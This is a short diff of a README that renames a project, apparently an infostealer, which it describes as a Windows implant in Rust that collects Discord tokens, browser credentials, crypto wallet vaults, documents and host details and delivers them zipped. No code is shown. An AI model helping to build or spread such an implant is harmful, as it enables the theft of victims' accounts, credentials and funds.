@@ -1,4 +1,4 @@
-# winagent
+# rustica
 
 Windows implant written in Rust. Collects Discord tokens, browser credentials,
 wallet vaults, documents and host details, zips them in memory and delivers the
